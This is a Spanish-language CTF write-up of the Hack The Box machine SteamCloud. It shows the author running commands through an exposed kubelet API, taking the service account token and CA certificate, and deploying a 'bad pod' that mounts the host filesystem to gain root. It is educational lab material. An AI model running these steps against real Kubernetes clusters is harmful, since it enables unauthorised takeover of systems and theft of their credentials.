---                                                                                                                                                                                          
layout: single                                                                                                                                                                               
title: SteamCloud HTB - WriteUp                                                                                                                                                                  
excerpt: WriteUp de la máquina SteamCloud de HTB.                                                                                                                                        
date: 2023-02-16                                                                                                                                                                             
classes: wide                                                                                                                                                                                
header:                                                                                                                                                                                      
  teaser: /assets/images/steamcloud/SteamCloud.png                                                                                                                                           
  teaser_home_page: true                                                                                                                                                                     
  icon: /assets/images/steamcloud/SteamCloud.png                                                                                                                                             
categories:                                                                                                                                                                                  
  - infosec                                                                                                                                                                                  
tags:                                                                                                                                                                                        
  - ctf
  - BadPod                                                                                                                                                                                  
  - Writeup                                                                                                                                                                                  
  - API                                                                                                                                                                                     
  - Kubernetes                                                                                                                                                                        
--- 

En esta máquina se toca principalmente Kubernetes. Es la primera vez que me enfrento a una máquina así. Entrare en mas detalle en algunas cosas.

### Escaneo de puertos.

Lo primero que haremos como siempre será escanear los puertos de la máquina.

```bash
# Nmap 7.91 scan initiated Thu Feb 16 18:11:24 2023 as: nmap -sC -sV -Pn -n -oN Extraction -p22,2379,2380,8443,10250 10.10.11.133
Nmap scan report for 10.10.11.133
Host is up (0.083s latency).

PORT      STATE SERVICE          VERSION
22/tcp    open  ssh              OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 fc:fb:90:ee:7c:73:a1:d4:bf:87:f8:71:e8:44:c6:3c (RSA)
|   256 46:83:2b:1b:01:db:71:64:6a:3e:27:cb:53:6f:81:a1 (ECDSA)
|_  256 1d:8d:d3:41:f3:ff:a4:37:e8:ac:78:08:89:c2:e3:c5 (ED25519)
2379/tcp  open  ssl/etcd-client?
| ssl-cert: Subject: commonName=steamcloud
| Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.10.11.133, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
| Not valid before: 2023-02-16T17:10:44
|_Not valid after:  2024-02-16T17:10:44
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  h2
2380/tcp  open  ssl/etcd-server?
| ssl-cert: Subject: commonName=steamcloud
| Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.10.11.133, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
| Not valid before: 2023-02-16T17:10:44
|_Not valid after:  2024-02-16T17:10:44
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  h2
8443/tcp  open  ssl/https-alt
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 403 Forbidden
|     Audit-Id: 0135d0cf-6fb3-4e58-9223-2062dc8eb263
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: 7f133690-d057-4f4c-82ec-de1088ec4326
|     X-Kubernetes-Pf-Prioritylevel-Uid: 7ee6cd43-a145-4cc4-860d-be7b5199df1a
|     Date: Thu, 16 Feb 2023 17:11:37 GMT
|     Content-Length: 212
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/nice ports,/Trinity.txt.bak"","reason":"Forbidden","details":{},"code":403}
|   GetRequest: 
|     HTTP/1.0 403 Forbidden
|     Audit-Id: f8781bc8-ab96-4877-a8c8-c86b68fe180f
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: 7f133690-d057-4f4c-82ec-de1088ec4326
|     X-Kubernetes-Pf-Prioritylevel-Uid: 7ee6cd43-a145-4cc4-860d-be7b5199df1a
|     Date: Thu, 16 Feb 2023 17:11:36 GMT
|     Content-Length: 185
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/"","reason":"Forbidden","details":{},"code":403}
|   HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Audit-Id: 79457a95-b45a-40cb-a62a-95cf0612eb32
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: 7f133690-d057-4f4c-82ec-de1088ec4326
|     X-Kubernetes-Pf-Prioritylevel-Uid: 7ee6cd43-a145-4cc4-860d-be7b5199df1a
|     Date: Thu, 16 Feb 2023 17:11:37 GMT
|     Content-Length: 189
|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot options path "/"","reason":"Forbidden","details":{},"code":403}
|_http-title: Site doesn't have a title (application/json).
| ssl-cert: Subject: commonName=minikube/organizationName=system:masters
| Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.10.11.133, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1
| Not valid before: 2023-02-15T17:10:42
|_Not valid after:  2026-02-15T17:10:42
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1
'''
10250/tcp open  ssl/http         Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
| ssl-cert: Subject: commonName=steamcloud@1676567446
| Subject Alternative Name: DNS:steamcloud
| Not valid before: 2023-02-16T16:10:46
|_Not valid after:  2024-02-16T16:10:46
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1
```

De este escaneo podemos sacar varias cosas en claro. Se están usando Kubernetes, para montar la infraestructura de kubernetes, permite crear un cluster de forma rapida y sencilla con fines de desarrollo y pruebas. Podemos ver 2 puertos interesantes:

- 8443 -> Es la API de kubernetes en minikube.
- 10250 -> Es la API de kubelet.

### API de Kubernetes.

Si probamos a hacer algunas pruebas sobre la API nos damos cuenta que necesitamos autenticarnos. Para hacer pruebas podemos usar la herramienta kubectl. En esta prueba he intentado sacar información del cluster.

```bash 
❯ kubectl --server https://10.10.11.133:8443 get pod
Please enter Username:
```

No disponemos de ningun usuario y contraseña, por eso pasamos a intentar enumerar la API de kubelet

### API de Kubelet.

Para enumerar kubelet he hecho uso de la herramienta kubeletctl, esta herramienta permite hacer consultas sobre esta API.

```bash
❯ kubeletctl runningpods -s 10.10.11.133 | jq -c '.items[].metadata'
{"name":"kube-proxy-vwthx","namespace":"kube-system","uid":"7e3f74e9-9167-4ac5-9ce9-74acda917b09","creationTimestamp":null}
{"name":"coredns-78fcd69978-b48pw","namespace":"kube-system","uid":"3bf8bedb-3dcc-4c66-9b0a-991dd7ac6315","creationTimestamp":null}
{"name":"storage-provisioner","namespace":"kube-system","uid":"127943f4-59de-4227-ac5f-8112c6a524a2","creationTimestamp":null}
{"name":"etcd-steamcloud","namespace":"kube-system","uid":"967b9bee71f2e3cec06ff1dbde2a2a19","creationTimestamp":null}
{"name":"nginx","namespace":"default","uid":"e2f71ae5-6d48-4f43-ad2a-3d2a2851162a","creationTimestamp":null}
{"name":"kube-scheduler-steamcloud","namespace":"kube-system","uid":"3232b72c69e9f8bf518a7d727d878b27","creationTimestamp":null}
{"name":"kube-controller-manager-steamcloud","namespace":"kube-system","uid":"be2478237d1af444b624cb01f51f79c4","creationTimestamp":null}
{"name":"kube-apiserver-steamcloud","namespace":"kube-system","uid":"c1926d0465cd9de10197b95a2c359105","creationTimestamp":null}
```

Aquí podemos ver los POD  en uso y los namespace del nodo.  Si nos fijamos podemos ver que hay un nodo que utiliza un namespace diferente al resto "default". Kubeletctl permite ejecutar comandos en pods. Si probamos a ejecutar comandos en el contenedor del POD "nginx" vemos que los comandos se ejecutan correctamente.

```bash
❯ kubeletctl exec "id" -s 10.10.11.133 -p 'nginx' -c nginx
uid=0(root) gid=0(root) groups=0(root)
```

La flag de usuario se encuentra dentro de /root.

```bash 
❯ kubeletctl exec "cat /root/user.txt" -s 10.10.11.133 -p 'nginx' -c nginx
4bed108ccc1fc161f94a9818eb5527f9
```

Ahora que tenemos acceso a uno de los contenedores podriamos buscar:

- ca.crt -> Es el certificado para verificar la comunicación de kubernetes.
- namespacce -> Indica el espacio de nombres actual.
- token -> Contiene el token de servicio del pod actual.

	Si conseguimos ca.crt y token podríamos autenticarnos en el cluster de kubernetes (puerto 8443)

En este caso los archivos se encuentran en esta ruta: 

```
-/run/secrets/kubernetes.io/serviceaccount
```

```bash
root@nginx:/run/secrets/kubernetes.io/serviceaccount# ls -la
ls -la
total 4
drwxrwxrwt 3 root root  140 Feb 16 19:38 .
drwxr-xr-x 3 root root 4096 Feb 16 17:12 ..
drwxr-xr-x 2 root root  100 Feb 16 19:38 ..2023_02_16_19_38_50.643472167
lrwxrwxrwx 1 root root   31 Feb 16 19:38 ..data -> ..2023_02_16_19_38_50.643472167
lrwxrwxrwx 1 root root   13 Feb 16 17:12 ca.crt -> ..data/ca.crt
lrwxrwxrwx 1 root root   16 Feb 16 17:12 namespace -> ..data/namespace
lrwxrwxrwx 1 root root   12 Feb 16 17:12 token -> ..data/token
root@nginx:/run/secrets/kubernetes.io/serviceaccount#

```

Pero también se podrian encontrar en: 

```
-   /var/run/secrets/kubernetes.io/serviceaccount
-   /secrets/kubernetes.io/serviceaccout
```

Si nos bajamos los archivos podemos ahora si podremos autenticarnos en el cluster y pedir información a la API de kubernetes.

```bash 
❯ kubectl --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$(cat token) get pod
NAME       READY   STATUS    RESTARTS   AGE
nginx      1/1     Running   0          163m
```

En este caso hemos hecho uso de la función get pod para sacar información del nodo en ejecución. 

![2023-02-16_21-00 1.png](/opt/bly-coder.github.io/assets/images/steamcloud/2023-02-16_21-00 1.png)
La tercera linea nos indica que podemos obtener, crear y listar pods. El siguiente paso sera examinar un el POD nginx para saber que imagen usa, posteriormente esta será usada en la creación de un BAD POD.

```bash
❯ kubectl get pod nginx -o yaml --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$(cat token)                                                                       
apiVersion: v1                                                                                                                                                                               
kind: Pod                                                                                                                                                                                    
metadata:                                                                                                                                                                                    
  annotations:                                                                                                                                                                               
    kubectl.kubernetes.io/last-applied-configuration: |                                                                                                                                      
      {"apiVersion":"v1","kind":"Pod","metadata":{"annotations":{},"name":"nginx","namespace":"default"},"spec":{"containers":[{"image":"nginx:1.14.2","imagePullPolicy":"Never","name":"ngin
x","volumeMounts":[{"mountPath":"/root","name":"flag"}]}],"volumes":[{"hostPath":{"path":"/opt/flag"},"name":"flag"}]}}                                                                      
  creationTimestamp: "2023-02-16T17:12:01Z"                                                                                                                                                  
  name: nginx                                                                                                                                                                                
  namespace: default                                                                                                                                                                         
  resourceVersion: "510"                                                                                                                                                                     
  uid: e2f71ae5-6d48-4f43-ad2a-3d2a2851162a                                                                                                                                                  
spec:                                                                                                                                                                                        
  containers:                                                                                                                                                                                
  - image: nginx:1.14.2                                                                                                                                                                      
    imagePullPolicy: Never      
```

Vemos que la imagen es nginx:1.14.2 lo suiguiente será construir un archivo YAML que contendrá el BAD POD.

```yml
apiVersion: v1
kind: Pod
metadata:
  name: pod-bly
  namespace: default
spec:
  containers:
  - name: pod-bly
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /mnt
      name: hostfs
  volumes:
  - name: hostfs
    hostPath:
      path: /
  automountServiceAccountToken: true
  hostNetwork: true

```

Este BAD POD montará en /mnt todo el sistema de ficheros de la máquina host. Ahora tendremos que ejecutar el POD

```bash
❯ kubectl apply -f bly.yaml --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$(cat token)
pod/pod-bly created
```

kubectl apply permite desplegar un POD. Si listamos los PODS podemos ver el nuestro.

```bash
❯ kubeletctl runningpods -s 10.10.11.133 | jq -c '.items[].metadata'
{"name":"pod-bly","namespace":"default","uid":"9ba59450-48e7-46a4-b159-521d93bd2cec","creationTimestamp":null}
```

Ahora solo tendremos que ejecutar comandos como hemos hecho anteriormente para ganar 
acceso root al sistema.

```bash
❯ kubeletctl exec "bash" -s 10.10.11.133 -p pod-bly -c pod-bly
root@steamcloud:/#
```

Si nos vamos a /mnt veremos montado todo el sistema y tendremos acceso a este. Aqui acaba esta máquina. Espero que te haya servido.
